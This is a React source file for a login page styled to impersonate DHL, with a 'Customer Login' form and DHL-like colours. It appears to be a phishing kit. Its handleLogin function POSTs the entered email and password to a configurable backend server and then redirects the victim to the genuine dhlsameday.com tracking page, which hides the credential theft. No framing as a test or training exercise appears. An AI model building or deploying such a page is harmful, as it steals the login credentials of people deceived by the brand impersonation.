import React, { useState } from "react";
import "./App.css";

// ✅ Only one API URL declaration
const API_URL = process.env.REACT_APP_API_URL || "http://localhost:5000";
console.log("✅ API URL used:", API_URL);

const DHLLoginPage = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showLanguages, setShowLanguages] = useState(false);
  const [showMobileMenu, setShowMobileMenu] = useState(false);
  const [activeDropdown, setActiveDropdown] = useState(null);
  const [isLoading, setIsLoading] = useState(false);

  const languages = [
    { code: "EN", name: "English", active: true },
    { code: "FR", name: "Français", active: false },
    { code: "DE", name: "Deutsch", active: false },
    { code: "IT", name: "Italiano", active: false },
    { code: "ES", name: "Español", active: false },
    { code: "KR", name: "한국어", active: false },
    { code: "JP", name: "日本語", active: false },
    { code: "CN", name: "中文", active: false },
  ];

  // ✅ Handle login
  const handleLogin = async () => {
    if (!email || !password) {
      alert("Email and password required");
      return;
    }

    setIsLoading(true);
    try {
      const response = await fetch(`${API_URL}/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (data.success) {
        window.location.href = "https://www.dhlsameday.com/SkyTracking/";
      } else {
        alert(`❌ ${data.message}`);
      }
    } catch (error) {
      console.error("Login error:", error);
      alert("Server error. Please try again later.");
    } finally {
      setIsLoading(false);
    }
  };

  // ✅ Submit on Enter key
  const handleKeyPress = (e) => {
    if (e.key === "Enter") handleLogin();
  };

  return (
    <div className="min-h-screen flex flex-col font-sans bg-white overflow-x-hidden">
      {/* HEADER */}
      <nav className="bg-gradient-to-b from-yellow-400 to-transparent border-b border-gray-200">
        {/* ... your nav code ... */}
      </nav>

      {/* MAIN LOGIN */}
      <main className="flex-1 flex items-center justify-center px-4 py-16">
        <div className="w-full max-w-md">
          <h1 className="text-3xl md:text-4xl font-bold text-center text-red-700 mb-10 uppercase">
            Customer Login
          </h1>

          <div className="bg-gray-100 shadow-lg rounded-lg p-8">
            <form
              onSubmit={(e) => {
                e.preventDefault();
                handleLogin();
              }}
            >
              <label htmlFor="email" className="block text-gray-700 text-lg mb-2">
                Email Address
              </label>
              <input
                id="email"
                type="email"
                value={email}
                placeholder="Enter your email"
                onChange={(e) => setEmail(e.target.value)}
                onKeyPress={handleKeyPress}
                className="w-full border border-gray-300 rounded px-3 py-2 text-base focus:ring-2 focus:ring-yellow-400 outline-none mb-4"
                autoComplete="email"
                required
              />

              <label htmlFor="password" className="block text-gray-700 text-lg mb-2">
                Password
              </label>
              <input
                id="password"
                type="password"
                value={password}
                placeholder="Enter your password"
                onChange={(e) => setPassword(e.target.value)}
                onKeyPress={handleKeyPress}
                className="w-full border border-gray-300 rounded px-3 py-2 text-base focus:ring-2 focus:ring-yellow-400 outline-none"
                autoComplete="current-password"
                required
              />

              <div className="text-center mt-6">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="bg-red-600 hover:bg-red-700 text-white font-semibold px-6 py-2 rounded transition disabled:opacity-50"
                >
                  {isLoading ? "Loading..." : "LOGIN"}
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* LANGUAGES MODAL */}
      {showLanguages && (
        <div className="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center z-50">
          {/* ... modal code ... */}
        </div>
      )}

      {/* FOOTER */}
      <footer className="bg-gray-200 py-6 border-t border-gray-300 mt-auto">
        {/* ... footer code ... */}
      </footer>
    </div>
  );
};

export default DHLLoginPage;
